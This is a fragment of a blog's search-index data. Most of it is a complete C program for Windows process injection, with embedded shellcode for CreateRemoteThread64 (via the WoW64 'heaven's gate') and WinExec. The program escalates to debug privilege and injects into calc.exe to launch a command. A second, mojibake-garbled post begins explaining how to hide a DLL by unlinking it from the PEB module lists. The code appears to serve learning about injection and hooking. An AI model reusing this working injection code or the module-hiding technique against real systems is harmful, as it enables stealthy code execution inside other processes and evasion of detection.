123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;TlHelp32.h&gt; #define CREATETHREADPIC_SIZE 271char CREATETHREADPIC[] = &#123; /* 0000 */ &quot;\\x53&quot; /* push rbx */ /* 0001 */ &quot;\\x56&quot; /* push rsi */ /* 0002 */ &quot;\\x57&quot; /* push rdi */ /* 0003 */ &quot;\\x55&quot; /* push rbp */ /* 0004 */ &quot;\\xe8\\x6c\\x00\\x00\\x00&quot; /* call 0x75 */ /* 0009 */ &quot;\\x85\\xc0&quot; /* test eax, eax */ /* 000B */ &quot;\\x74\\x5d&quot; /* jz 0x6a */ /* 000D */ &quot;\\x48\\x89\\xe6&quot; /* mov rsi, rsp */ /* 0010 */ &quot;\\x48\\x83\\xe4\\xf0&quot; /* and rsp, 0xfffffffffffffff0 */ /* 0014 */ &quot;\\x48\\x83\\xec\\x68&quot; /* sub rsp, 0x68 */ /* 0018 */ &quot;\\xb8\\xfa\\x80\\x39\\x5e&quot; /* mov eax, 0x5e3980fa */ /* 001D */ &quot;\\xe8\\x78\\x00\\x00\\x00&quot; /* call 0x9a */ /* 0022 */ &quot;\\x48\\x89\\xc3&quot; /* mov rbx, rax */ /* 0025 */ &quot;\\x4d\\x31\\xc0&quot; /* xor r8, r8 */ /* 0028 */ &quot;\\x48\\x31\\xc0&quot; /* xor rax, rax */ /* 002B */ &quot;\\x48\\x89\\x44\\x24\\x50&quot; /* mov [rsp+0x50], rax */ /* 0030 */ &quot;\\x48\\x89\\x44\\x24\\x48&quot; /* mov [rsp+0x48], rax */ /* 0035 */ &quot;\\x48\\x89\\x44\\x24\\x40&quot; /* mov [rsp+0x40], rax */ /* 003A */ &quot;\\x48\\x89\\x44\\x24\\x38&quot; /* mov [rsp+0x38], rax */ /* 003F */ &quot;\\x48\\x89\\x44\\x24\\x30&quot; /* mov [rsp+0x30], rax */ /* 0044 */ &quot;\\x8b\\x46\\x24&quot; /* mov eax, [rsi+0x24] */ /* 0047 */ &quot;\\x48\\x89\\x44\\x24\\x28&quot; /* mov [rsp+0x28], rax */ /* 004C */ &quot;\\x8b\\x46\\x20&quot; /* mov eax, [rsi+0x20] */ /* 004F */ &quot;\\x48\\x89\\x44\\x24\\x20&quot; /* mov [rsp+0x20], rax */ /* 0054 */ &quot;\\x44\\x8b\\x4e\\x14&quot; /* mov r9d, [rsi+0x14] */ /* 0058 */ &quot;\\xba\\x00\\x00\\x00\\x10&quot; /* mov edx, 0x10000000 */ /* 005D */ &quot;\\x8b\\x4e\\x30&quot; /* mov ecx, [rsi+0x30] */ /* 0060 */ &quot;\\xff\\xd3&quot; /* call rbx */ /* 0062 */ &quot;\\x48\\x89\\xf4&quot; /* mov rsp, rsi */ /* 0065 */ &quot;\\xe8\\x18\\x00\\x00\\x00&quot; /* call 0x82 */ /* 006A */ &quot;\\x5d&quot; /* pop rbp */ /* 006B */ &quot;\\x5f&quot; /* pop rdi */ /* 006C */ &quot;\\x5e&quot; /* pop rsi */ /* 006D */ &quot;\\x5b&quot; /* pop rbx */ /* 006E */ &quot;\\xc3&quot; /* ret */ /* 006F */ &quot;\\x31\\xc0&quot; /* xor eax, eax */ /* 0071 */ &quot;\\x48\\xf7\\xd8&quot; /* neg rax */ /* 0074 */ &quot;\\xc3&quot; /* ret */ /* 0075 */ &quot;\\xe8\\xf5\\xff\\xff\\xff&quot; /* call 0x6f */ /* 007A */ &quot;\\x74\\x05&quot; /* jz 0x81 */ /* 007C */ &quot;\\x58&quot; /* pop rax */ /* 007D */ &quot;\\x6a\\x33&quot; /* push 0x33 */ /* 007F */ &quot;\\x50&quot; /* push rax */ /* 0080 */ &quot;\\xcb&quot; /* retf */ /* 0081 */ &quot;\\xc3&quot; /* ret */ /* 0082 */ &quot;\\xe8\\xe8\\xff\\xff\\xff&quot; /* call 0x6f */ /* 0087 */ &quot;\\x75\\x10&quot; /* jnz 0x99 */ /* 0089 */ &quot;\\x58&quot; /* pop rax */ /* 008A */ &quot;\\x83\\xec\\x08&quot; /* sub esp, 0x8 */ /* 008D */ &quot;\\x89\\x04\\x24&quot; /* mov [rsp], eax */ /* 0090 */ &quot;\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00&quot; /* mov dword [rsp+0x4], 0x23 */ /* 0098 */ &quot;\\xcb&quot; /* retf */ /* 0099 */ &quot;\\xc3&quot; /* ret */ /* 009A */ &quot;\\x56&quot; /* push rsi */ /* 009B */ &quot;\\x57&quot; /* push rdi */ /* 009C */ &quot;\\x53&quot; /* push rbx */ /* 009D */ &quot;\\x51&quot; /* push rcx */ /* 009E */ &quot;\\x49\\x89\\xc0&quot; /* mov r8, rax */ /* 00A1 */ &quot;\\x6a\\x60&quot; /* push 0x60 */ /* 00A3 */ &quot;\\x5e&quot; /* pop rsi */ /* 00A4 */ &quot;\\x65\\x48\\x8b\\x06&quot; /* mov rax, [gs:rsi] */ /* 00A8 */ &quot;\\x48\\x8b\\x40\\x18&quot; /* mov rax, [rax+0x18] */ /* 00AC */ &quot;\\x4c\\x8b\\x50\\x30&quot; /* mov r10, [rax+0x30] */ /* 00B0 */ &quot;\\x49\\x8b\\x6a\\x10&quot; /* mov rbp, [r10+0x10] */ /* 00B4 */ &quot;\\x48\\x85\\xed&quot; /* test rbp, rbp */ /* 00B7 */ &quot;\\x89\\xe8&quot; /* mov eax, ebp */ /* 00B9 */ &quot;\\x74\\x4f&quot; /* jz 0x10a */ /* 00BB */ &quot;\\x4d\\x8b\\x12&quot; /* mov r10, [r10] */ /* 00BE */ &quot;\\x8b\\x45\\x3c&quot; /* mov eax, [rbp+0x3c] */ /* 00C1 */ &quot;\\x83\\xc0\\x10&quot; /* add eax, 0x10 */ /* 00C4 */ &quot;\\x8b\\x44\\x05\\x78&quot; /* mov eax, [rbp+rax+0x78] */ /* 00C8 */ &quot;\\x48\\x8d\\x74\\x05\\x18&quot; /* lea rsi, [rbp+rax+0x18] */ /* 00CD */ &quot;\\xad&quot; /* lodsd */ /* 00CE */ &quot;\\x91&quot; /* xchg ecx, eax */ /* 00CF */ &quot;\\x67\\xe3\\xde&quot; /* jecxz 0xb0 */ /* 00D2 */ &quot;\\xad&quot; /* lodsd */ /* 00D3 */ &quot;\\x4c\\x8d\\x5c\\x05\\x00&quot; /* lea r11, [rbp+rax] */ /* 00D8 */ &quot;\\xad&quot; /* lodsd */ /* 00D9 */ &quot;\\x48\\x8d\\x7c\\x05\\x00&quot; /* lea rdi, [rbp+rax] */ /* 00DE */ &quot;\\xad&quot; /* lodsd */ /* 00DF */ &quot;\\x48\\x8d\\x5c\\x05\\x00&quot; /* lea rbx, [rbp+rax] */ /* 00E4 */ &quot;\\x8b\\x74\\x8f\\xfc&quot; /* mov esi, [rdi+rcx*4-0x4] */ /* 00E8 */ &quot;\\x48\\x01\\xee&quot; /* add rsi, rbp */ /* 00EB */ &quot;\\x31\\xc0&quot; /* xor eax, eax */ /* 00ED */ &quot;\\x99&quot; /* cdq */ /* 00EE */ &quot;\\xac&quot; /* lodsb */ /* 00EF */ &quot;\\x01\\xc2&quot; /* add edx, eax */ /* 00F1 */ &quot;\\xc1\\xc2\\x05&quot; /* rol edx, 0x5 */ /* 00F4 */ &quot;\\xff\\xc8&quot; /* dec eax */ /* 00F6 */ &quot;\\x79\\xf6&quot; /* jns 0xee */ /* 00F8 */ &quot;\\x44\\x39\\xc2&quot; /* cmp edx, r8d */ /* 00FB */ &quot;\\xe0\\xe7&quot; /* loopne 0xe4 */ /* 00FD */ &quot;\\x75\\xb1&quot; /* jnz 0xb0 */ /* 00FF */ &quot;\\x0f\\xb7\\x14\\x4b&quot; /* movzx edx, word [rbx+rcx*2] */ /* 0103 */ &quot;\\x41\\x8b\\x04\\x93&quot; /* mov eax, [r11+rdx*4] */ /* 0107 */ &quot;\\x48\\x01\\xe8&quot; /* add rax, rbp */ /* 010A */ &quot;\\x59&quot; /* pop rcx */ /* 010B */ &quot;\\x5b&quot; /* pop rbx */ /* 010C */ &quot;\\x5f&quot; /* pop rdi */ /* 010D */ &quot;\\x5e&quot; /* pop rsi */ /* 010E */ &quot;\\xc3&quot; /* ret */&#125;;#define EXECPIC_SIZE 123char EXECPIC[] = &#123; /* 0000 */ &quot;\\x53&quot; /* push rbx */ /* 0001 */ &quot;\\x56&quot; /* push rsi */ /* 0002 */ &quot;\\x57&quot; /* push rdi */ /* 0003 */ &quot;\\x55&quot; /* push rbp */ /* 0004 */ &quot;\\x83\\xec\\x28&quot; /* sub esp, 0x28 */ /* 0007 */ &quot;\\x31\\xc0&quot; /* xor eax, eax */ /* 0009 */ &quot;\\x40\\x92&quot; /* xchg edx, eax */ /* 000B */ &quot;\\x74\\x1a&quot; /* jz 0x27 */ /* 000D */ &quot;\\x8b\\x4c\\x24\\x3c&quot; /* mov ecx, [rsp+0x3c] */ /* 0011 */ &quot;\\x50&quot; /* push rax */ /* 0012 */ &quot;\\x51&quot; /* push rcx */ /* 0013 */ &quot;\\x64\\x8b\\x72\\x2f&quot; /* mov esi, [fs:rdx+0x2f] */ /* 0017 */ &quot;\\x8b\\x76\\x0c&quot; /* mov esi, [rsi+0xc] */ /* 001A */ &quot;\\x8b\\x76\\x0c&quot; /* mov esi, [rsi+0xc] */ /* 001D */ &quot;\\xad&quot; /* lodsd */ /* 001E */ &quot;\\x8b\\x30&quot; /* mov esi, [rax] */ /* 0020 */ &quot;\\x8b\\x7e\\x18&quot; /* mov edi, [rsi+0x18] */ /* 0023 */ &quot;\\xb2\\x50&quot; /* mov dl, 0x50 */ /* 0025 */ &quot;\\xeb\\x17&quot; /* jmp 0x3e */ /* 0027 */ &quot;\\xb2\\x60&quot; /* mov dl, 0x60 */ /* 0029 */ &quot;\\x65\\x48\\x8b\\x32&quot; /* mov rsi, [gs:rdx] */ /* 002D */ &quot;\\x48\\x8b\\x76\\x18&quot; /* mov rsi, [rsi+0x18] */ /* 0031 */ &quot;\\x48\\x8b\\x76\\x10&quot; /* mov rsi, [rsi+0x10] */ /* 0035 */ &quot;\\x48\\xad&quot; /* lodsq */ /* 0037 */ &quot;\\x48\\x8b\\x30&quot; /* mov rsi, [rax] */ /* 003A */ &quot;\\x48\\x8b\\x7e\\x30&quot; /* mov rdi, [rsi+0x30] */ /* 003E */ &quot;\\x03\\x57\\x3c&quot; /* add edx, [rdi+0x3c] */ /* 0041 */ &quot;\\x8b\\x5c\\x17\\x28&quot; /* mov ebx, [rdi+rdx+0x28] */ /* 0045 */ &quot;\\x8b\\x74\\x1f\\x20&quot; /* mov esi, [rdi+rbx+0x20] */ /* 0049 */ &quot;\\x48\\x01\\xfe&quot; /* add rsi, rdi */ /* 004C */ &quot;\\x8b\\x54\\x1f\\x24&quot; /* mov edx, [rdi+rbx+0x24] */ /* 0050 */ &quot;\\x0f\\xb7\\x2c\\x17&quot; /* movzx ebp, word [rdi+rdx] */ /* 0054 */ &quot;\\x48\\x8d\\x52\\x02&quot; /* lea rdx, [rdx+0x2] */ /* 0058 */ &quot;\\xad&quot; /* lodsd */ /* 0059 */ &quot;\\x81\\x3c\\x07\\x57\\x69\\x6e\\x45&quot; /* cmp dword [rdi+rax], 0x456e6957 */ /* 0060 */ &quot;\\x75\\xee&quot; /* jnz 0x50 */ /* 0062 */ &quot;\\x8b\\x74\\x1f\\x1c&quot; /* mov esi, [rdi+rbx+0x1c] */ /* 0066 */ &quot;\\x48\\x01\\xfe&quot; /* add rsi, rdi */ /* 0069 */ &quot;\\x8b\\x34\\xae&quot; /* mov esi, [rsi+rbp*4] */ /* 006C */ &quot;\\x48\\x01\\xf7&quot; /* add rdi, rsi */ /* 006F */ &quot;\\x99&quot; /* cdq */ /* 0070 */ &quot;\\xff\\xd7&quot; /* call rdi */ /* 0072 */ &quot;\\x48\\x83\\xc4\\x28&quot; /* add rsp, 0x28 */ /* 0076 */ &quot;\\x5d&quot; /* pop rbp */ /* 0077 */ &quot;\\x5f&quot; /* pop rdi */ /* 0078 */ &quot;\\x5e&quot; /* pop rsi */ /* 0079 */ &quot;\\x5b&quot; /* pop rbx */ /* 007A */ &quot;\\xc3&quot; /* ret */&#125;;typedef VOID(*pCreateRemoteThread64) (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);typedef struct _RemoteParam &#123; char szMsg[12]; DWORD dwMessageBox;&#125; RemoteParam, * PRemoteParam;typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCTSTR, LPCTSTR, DWORD);BOOL IsWow64(HANDLE hProcess)&#123; typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); LPFN_ISWOW64PROCESS fnIsWow64Process; BOOL bIsWow64 = FALSE; fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;), &quot;IsWow64Process&quot;); if (NULL != fnIsWow64Process) &#123; fnIsWow64Process(hProcess, &amp;bIsWow64); &#125; return bIsWow64;&#125;DWORD processNameToId(LPCTSTR lpszProcessName)&#123; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) &#123; MessageBox(NULL, &quot;The frist entry of the process list has not been copyied to the buffer&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; while (Process32Next(hSnapshot, &amp;pe)) &#123; if (!strcmp(lpszProcessName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; return 0;&#125;BOOL Is64BitOS()&#123; typedef VOID(WINAPI* LPFN_GetNativeSystemInfo)(__out LPSYSTEM_INFO lpSystemInfo); LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandle(&quot;kernel32&quot;), &quot;GetNativeSystemInfo&quot;); if (fnGetNativeSystemInfo) &#123; SYSTEM_INFO stInfo = &#123; 0 &#125;; fnGetNativeSystemInfo(&amp;stInfo); if (stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) &#123; return TRUE; &#125; &#125; return FALSE;&#125;LPVOID init_func(char* asmcode, DWORD len)&#123; LPVOID sc = NULL; // allocate write/executable memory for code sc = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (sc != NULL) &#123; // copy code memcpy(sc, asmcode, len); &#125; else &#123; MessageBox(NULL, &quot;VirtualAlloc()&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; return sc;&#125;DWORD __stdcall threadProc(LPVOID lParam)&#123; RemoteParam* pRP = (RemoteParam*)lParam; PFN_MESSAGEBOX pfnMessageBox; pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox; pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0); return 0;&#125;bool enableDebugPriv()&#123; HANDLE hToken; LUID sedebugnameValue; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; return false; &#125; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) &#123; CloseHandle(hToken); return false; &#125; tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = sedebugnameValue; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; CloseHandle(hToken); return false; &#125; return true;&#125;void free_func(LPVOID func) &#123; if (func != NULL) &#123; VirtualFree(func, 0, MEM_RELEASE); &#125;&#125;int main()&#123; BOOL bWow64; char* szExeName = (char*)&quot;calc.exe&quot;; DWORD dwProcessId = processNameToId(szExeName); if (dwProcessId == 0) &#123; MessageBox(NULL, &quot;The target process have not been found !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return -1; &#125; HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hTargetProcess) &#123; MessageBox(NULL, &quot;Open target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; bWow64 = IsWow64(hTargetProcess); if (bWow64 || !Is64BitOS()) &#123; printf(&quot;32-bit process\\n&quot;); const DWORD dwThreadSize = 4096; DWORD dwWriteBytes; enableDebugPriv(); void* pRemoteThread = VirtualAllocEx(hTargetProcess, 0, dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!pRemoteThread) &#123; MessageBox(NULL, &quot;Alloc memory in target process failed !&quot;, &quot;notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; if (!WriteProcessMemory(hTargetProcess, pRemoteThread, &amp;threadProc, dwThreadSize, 0)) &#123; MessageBox(NULL, &quot;Write data to target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; RemoteParam remoteData; ZeroMemory(&amp;remoteData, sizeof(RemoteParam)); HINSTANCE hUser32 = LoadLibrary(&quot;User32.dll&quot;); remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;); strcat_s(remoteData.szMsg, &quot;Helloï¼¼0&quot;); RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx( hTargetProcess, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE); if (!pRemoteParam) &#123; MessageBox(NULL, &quot;Alloc memory failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; if (!WriteProcessMemory(hTargetProcess, pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) &#123; MessageBox(NULL, &quot;Write data to target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; HANDLE hRemoteThread = CreateRemoteThread( hTargetProcess, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread, pRemoteParam, 0, &amp;dwWriteBytes); if (!hRemoteThread) &#123; MessageBox(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; CloseHandle(hRemoteThread); FreeLibrary(hUser32); &#125; else &#123; printf(&quot;64-bit process\\n&quot;); char* cmd = (char*)&quot;cmd /c start calc.exe&quot;; int CmdSize = strlen(cmd); HANDLE hProc, hThread; BOOL bStatus = FALSE; LPVOID pCode = NULL, pData = NULL; SIZE_T written; DWORD idx, ec; pCreateRemoteThread64 CreateRemoteThread64 = NULL; // try open the process printf(&quot; [ opening process id %lu\\n&quot;, dwProcessId); hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProc != NULL) &#123; // allocate memory there printf(&quot; [ allocating %lu bytes of XRW memory in process for code\\n&quot;, EXECPIC_SIZE); pCode = VirtualAllocEx(hProc, 0, EXECPIC_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (pCode != NULL) &#123; // write the code printf(&quot; [ writing %lu bytes of code to 0x%p\\n&quot;, EXECPIC_SIZE, pCode); bStatus = WriteProcessMemory(hProc, pCode, EXECPIC, EXECPIC_SIZE, &amp;written); if (bStatus) &#123; if (cmd != NULL) &#123; printf(&quot; [ allocating %lu bytes of RW memory in process for parameter\\n&quot;, CmdSize); pData = VirtualAllocEx(hProc, 0, CmdSize + 1, MEM_COMMIT, PAGE_READWRITE); if (pData != NULL) &#123; printf(&quot; [ writing %lu bytes of data to 0x%p\\n&quot;, CmdSize, pData); bStatus = WriteProcessMemory(hProc, pData, cmd, CmdSize, &amp;written); if (!bStatus) &#123; printf(&quot; [ warning: unable to allocate write parameters to process...&quot;); &#125; &#125; &#125; printf(&quot; [ creating thread\\n&quot;); hThread = NULL; CreateRemoteThread64 = (pCreateRemoteThread64) init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE); CreateRemoteThread64(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pCode, pData, 0, 0, &amp;hThread); if (hThread != NULL) &#123; printf(&quot; [ waiting for thread %lx to terminate\\n&quot;, (DWORD)hThread); idx = WaitForSingleObject(hThread, INFINITE); if (idx != 0) &#123; MessageBox(NULL, &quot;WaitForSingleObject&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; ec = 0; if (GetExitCodeThread(hThread, &amp;ec)) &#123; printf(&quot; [ exit code was %lu (%08lX)&quot;, ec, ec); &#125; CloseHandle(hThread); &#125; else &#123; MessageBox(NULL, &quot;CreateRemoteThread&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; &#125; if (idx == 0) &#123; VirtualFreeEx(hProc, pCode, 0, MEM_RELEASE); if (pData != NULL) &#123; VirtualFreeEx(hProc, pData, 0, MEM_RELEASE); &#125; &#125; &#125; else &#123; MessageBox(NULL, &quot;VirtualFreeEx()&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; CloseHandle(hProc); &#125; else &#123; MessageBox(NULL, &quot;OpenProcess&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; if (CreateRemoteThread64 != NULL) free_func(CreateRemoteThread64); return bStatus; &#125;&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"Inject","slug":"Inject","permalink":"https://hodlyounger.github.io/tags/Inject/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Inject&Hook","slug":"A-OS/Windows/Inject-Hook","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Inject-Hook/"}]},{"title":"ã€windowsã€‘é‡è¦ç»“æ„ä½“ä¹‹é—´çš„å…³ç³»","date":"2024-01-23T06:08:14.151Z","path":"A_OS/Windows/æ–‡ä»¶ä¸ç»“æ„ä½“/ã€winã€‘é‡è¦ç»“æ„ä½“ä¹‹é—´çš„å…³ç³»/","text":"æ¦‚è¿°ï¼šä¸€å›¾å±•ç¤ºwindowsé‡è¦ç»“æ„ä½“ä¹‹é—´çš„å…³ç³»","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æ–‡ä»¶ä¸ç»“æ„ä½“","slug":"A-OS/Windows/æ–‡ä»¶ä¸ç»“æ„ä½“","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%96%87%E4%BB%B6%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93/"}]},{"title":"ã€windowsã€‘é€šè¿‡æ–­é“¾éšè—æ¨¡å—(DLLï¼‰","date":"2024-01-23T06:08:14.145Z","path":"A_OS/Windows/win/ã€winã€‘é€šè¿‡æ–­é“¾éšè—æ¨¡å—/","text":"æ¦‚è¿°ï¼šä¸»è¦é€šè¿‡ TEB + PEB å®ç° 1. ä¸‰ç¯æ–­é“¾(EPBæ–­é“¾) ä½œç”¨ï¼š3ç¯æ–­é“¾é€šå¸¸ç”¨äºåœ¨ç”¨æˆ·å±‚éšè—dll 1.1. æ­¥éª¤è¯´æ˜ è·å–dllæ¨¡å—çš„æ­¥éª¤ï¼š è·å–TEB è·å–PEB è·å–ldr dllæ¨¡å— è¯¦ç»†æ­¥éª¤ï¼š TEB çš„è·å–æ–¹æ³•ä¸º: fs:[0]fs:[0]fs:[0] é€šè¿‡ TEB ç»“æ„ä½“å‘ç°ï¼Œ PPEB(PEBæŒ‡é’ˆï¼Œåªæƒ³PEBç»“æ„ä½“é¦–åœ°å€)ï¼Œä½äº TEB åç§» 0x30 å¤„ï¼Œå› æ­¤ PPEB==fs:[0x30]PPEB == fs:[0x30]PPEB==fs:[0x30] é€šè¿‡ PEB ç»“æ„ä½“å‘ç°ï¼Œ ldr ä½äº PEB åç§» 0xc å¤„,å› æ­¤ ldr==PPEB+0xcldr==PPEB+0xcldr==PPEB+0xc é€šè¿‡ ldr æŒ‡å‘çš„ç»“æ„ä½“ _PEN_LDR_DATA ç»“æ„ä½“æ‰¾åˆ°3ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ _LIST_ENTRY ç»“æ„ä½“ã€‚ _LIST_ENTRY ç»“æ„ä½“ä¸­æœ‰ä¸¤ä¸ªæˆå‘˜ï¼ŒæŒ‡å‘å‰é©±æ¨¡å—èŠ‚ç‚¹çš„ _LIST_ENTRYã€æŒ‡å‘åç»§æ¨¡å—èŠ‚ç‚¹çš„ _LIST_ENTRY ã€‚ èŠ‚ç‚¹æŒ‡é’ˆæŒ‡å‘çš„æ˜¯ _LIST_ENTRY ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å­˜å‚¨äº†æ¨¡å—åœ¨é“¾è¡¨ä¸­çš„ä½ç½®ä¿¡æ¯ é€šè¿‡ _LDR_DATA_TATBLE_ENTRY ç»“æ„ä½“ä¸­åç§» 0x18 çš„ DllBase ç¡®å®šè¦éšè—çš„dll,å¹¶é€šè¿‡è¯¥ç»“æ„ä½“ä¸­çš„ _LIST_ENTRY ç»“æ„ä½“åˆ é™¤è¯¥èŠ‚ç‚¹åœ¨é“¾è¡¨ä¸­çš„ä½ç½®ä¿¡æ¯ï¼ˆåŒå‘å¾ªç¯é“¾è¡¨åˆ é™¤èŠ‚ç‚¹ï¼‰ï¼Œå³å¯è¾¾åˆ°3ç¯ä¸‹çš„dlléšè—ã€‚ _LDR_DATA_TABLE_ENTRY ä¸ _PEB_LDR_DATA çš„å…³ç³»ï¼š _LDR_DATA_TABLE_ENTRY ä¸ _PEB_LDR_DATA çš„å…³ç³»æ˜¯ï¼Œ_LDR_DATA_TABLE_ENTRY æ˜¯ _PEB_LDR_DATA ç»“æ„çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨æ¨¡å—åŠ è½½ç›¸å…³ä¿¡æ¯ã€‚ å…·ä½“æ¥è¯´ï¼Œ_PEB_LDR_DATA ç»“æ„åŒ…å«ä¸‰ä¸ªé“¾è¡¨æ’åºæ–¹å¼ï¼Œåˆ†åˆ«æ˜¯æ¨¡å—åŠ è½½é¡ºåºã€æ¨¡å—å†…å­˜é¡ºåºã€æ¨¡å—åˆå§‹åŒ–é¡ºåºã€‚è¿™äº›é“¾è¡¨ç»“æ„æ˜¯é€šè¿‡_LDR_DATA_TABLE_ENTRY æ¥å­˜å‚¨çš„ï¼Œæ¯ä¸ª _LDR_DATA_TABLE_ENTRY éƒ½åŒ…å«äº†æ¨¡å—çš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚æ¨¡å—åç§°ã€æ¨¡å—å¤§å°ã€æ¨¡å—åœ°å€ç­‰ã€‚ åœ¨è°ƒè¯•ä¿¡æ¯ä¸­ï¼Œå¯ä»¥é€šè¿‡æ–­ç‚¹å’ŒæŸ¥çœ‹å¯„å­˜å™¨ç­‰æ–¹å¼æ¥æŸ¥çœ‹ _LDR_DATA_TABLE_ENTRY å’Œ _PEB_LDR_DATA çš„å†…å®¹ï¼Œè¿›è€Œåˆ†ææ¨¡å—çš„åŠ è½½å’Œè¿è¡Œæƒ…å†µã€‚ 1.2. ç›¸å…³ç»“æ„ä½“ 1.2.1. TEB 1234567891011121314151617kd&gt; dt _TEBntdll!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB // PPEB +0x034 LastErrorValue : Uint4B +0x038 CountOfOwnedCriticalSections : Uint4B +0x03c CsrClientThread : Ptr32 Void +0x040 Win32ThreadInfo : Ptr32 Void +0x044 User32Reserved : [26] Uint4B +0x0ac UserReserved : [5] Uint4B +0x0c0 WOW32Reserved : Ptr32 Void +0x0c4 CurrentLocale : Uint4B ... ... 1.2.2. PEB 123456789101112131415161718kd&gt; dt _PEBntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 SpareBool : UChar +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA // ldr +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS +0x014 SubSystemData : Ptr32 Void +0x018 ProcessHeap : Ptr32 Void +0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION +0x020 FastPebLockRoutine : Ptr32 Void +0x024 